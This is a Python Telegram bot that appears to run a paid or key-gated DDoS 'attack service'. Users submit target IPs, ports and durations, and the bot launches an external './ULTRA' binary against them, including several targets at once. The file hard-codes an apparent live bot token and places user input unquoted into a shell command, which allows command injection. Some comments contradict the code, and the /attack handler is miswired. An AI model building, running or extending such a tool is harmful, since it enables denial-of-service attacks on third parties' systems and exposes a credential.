import os
import asyncio
import random
import string
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7831102909:AAG3y0-k3qzoIX4SJCGtbHkDiDNJXuT3zdk'
ALLOWED_USER_ID = 6135948216  # Admin user ID
bot_access_free = True  

# Store pending attack requests, keys, and redeemed keys
pending_requests = {}
user_keys = {}
redeemed_keys = {}
active_attacks = {}  # Track active attacks per user (chat_id)

# Key expiry time (in seconds)
KEY_EXPIRY_TIME = 300  # 5 minutes for standard keys
LONG_KEY_EXPIRY_TIME = 300  # 120 minutes (2 hours) for the new long-term keys
REDEEMED_KEY_EXPIRY_TIME = 300  # 10 minutes for redeemed keys

def generate_key(expiry_time=KEY_EXPIRY_TIME):
    """Generate a random key with a custom expiry time."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)), expiry_time

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <key>*\n"
        "*Use /multiattack <ip1> <port1> <duration1> <ip2> <port2> <duration2> ... <key>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        # Simulate the attack process (replace with actual command to run attack)
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        # Mark the attack as completed
        active_attacks[chat_id] = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def multiattack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user has an active attack
    if active_attacks.get(chat_id, False):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You already have an ongoing attack! Please wait for it to finish before launching a new one.*", parse_mode='Markdown')
        return

    # Set the chat_id as active (lock the user)
    active_attacks[chat_id] = True

    # Check if the user has redeemed a valid key
    if chat_id not in redeemed_keys or redeemed_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ You don't have a valid redeemed key! Please redeem your key with /redeem <key>.*", parse_mode='Markdown')
        active_attacks[chat_id] = False  # Unlock user in case of key validation failure
        return

    args = context.args

    if len(args) < 4 or len(args) % 3 != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /multiattack <ip1> <port1> <duration1> <ip2> <port2> <duration2> ... <key>*", parse_mode='Markdown')
        active_attacks[chat_id] = False  # Unlock user in case of invalid usage
        return

    # Extract all attack parameters
    attacks = []
    for i in range(0, len(args) - 1, 3):
        ip = args[i]
        port = args[i+1]
        duration = int(args[i+2])
        attacks.append((ip, port, duration))

    key = args[-1]

    # Validate key
    if chat_id not in user_keys or user_keys[chat_id]['key'] != key or user_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid or expired key! Please generate a new key using /genkey.*", parse_mode='Markdown')
        active_attacks[chat_id] = False  # Unlock user in case of invalid key
        return

    # Notify user that multi-attack is being launched
    await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Multi-Attack Launched! ⚔️*\n"
                                                         f"*🎯 Attacking targets...*\n"
                                                         f"Using key: {key}",
                                   parse_mode='Markdown')

    # Launch attacks concurrently
    tasks = []
    for ip, port, duration in attacks:
        tasks.append(run_attack(chat_id, ip, port, duration, context))

    # Wait for all attacks to complete
    await asyncio.gather(*tasks)

    # Notify user after all attacks are completed
    await context.bot.send_message(chat_id=chat_id, text="*✅ All attacks completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
    active_attacks[chat_id] = False  # Unlock the user after completing all attacks

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0]

    # Check if the key is valid and not expired
    if chat_id not in user_keys or user_keys[chat_id]['key'] != key or user_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid or expired key! Please generate a new key using /genkey.*", parse_mode='Markdown')
        return

    # Redeem the key (mark it as redeemed and store the expiration time for the redeem period)
    redeemed_keys[chat_id] = {'key': key, 'expiry': time.time() + REDEEMED_KEY_EXPIRY_TIME}

    # Inform the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🔑 Key Redeemed!*\nYour key is now active for performing actions like attacking.\n"
             f"*🕒 You can use this key for {REDEEMED_KEY_EXPIRY_TIME // 60} minutes.*",
        parse_mode='Markdown'
    )

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Check if the user is authorized (admin)
    if chat_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use the /genkey command!*", parse_mode='Markdown')
        return

    # Generate a standard key (valid for 5 minutes)
    if len(context.args) == 0 or context.args[0] == 'short':
        key, expiry_time = generate_key(KEY_EXPIRY_TIME)
    # Generate a long-term key (valid for 120 minutes)
    elif len(context.args) == 1 and context.args[0] == 'long':
        key, expiry_time = generate_key(LONG_KEY_EXPIRY_TIME)
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey [short|long]*", parse_mode='Markdown')
        return

    # Store the generated key for the user
    user_keys[chat_id] = {'key': key, 'expiry': time.time() + expiry_time}

    # Send the generated key and expiry info to the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🔑 Your key: {key}* \n"
             f"*🕒 This key will expire in {expiry_time // 60} minutes.*",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", run_attack))
    application.add_handler(CommandHandler("multiattack", multiattack))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("genkey", genkey))

    application.run_polling()

if __name__ == '__main__':
    main()
